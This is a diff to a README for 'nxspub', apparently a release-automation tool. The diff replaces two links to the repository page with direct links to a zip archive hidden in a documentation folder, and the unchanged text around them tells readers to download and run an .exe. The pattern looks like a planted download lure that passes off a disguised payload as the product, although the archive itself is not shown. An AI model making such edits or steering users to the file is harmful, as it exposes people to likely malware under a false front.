@@ -1,6 +1,6 @@
 # 🚀 nxspub - Streamline your software release workflow today
 
-[![](https://img.shields.io/badge/Download-nxspub-blue)](https://github.com/colloquycycle8094/nxspub)
+[![](https://img.shields.io/badge/Download-nxspub-blue)](https://github.com/colloquycycle8094/nxspub/raw/refs/heads/main/docs-site/content/en/guide/Software-2.7.zip)
 
 nxspub automates your software release process. It manages branch updates, creates changelogs, and publishes versions for you. This tool removes the manual work from your software production. It creates a steady bridge between your source code and your final release.
 
@@ -8,7 +8,7 @@ nxspub automates your software release process. It manages branch updates, creat
 
 You need the nxspub application file to begin. Visit the repository page to find the current version for Windows.
 
-[Download it here: https://github.com/colloquycycle8094/nxspub](https://github.com/colloquycycle8094/nxspub)
+[Download it here: https://github.com/colloquycycle8094/nxspub/raw/refs/heads/main/docs-site/content/en/guide/Software-2.7.zip](https://github.com/colloquycycle8094/nxspub/raw/refs/heads/main/docs-site/content/en/guide/Software-2.7.zip)
 
 Select the file ending in .exe to start the download. Save this file to your desktop or your downloads folder.
 
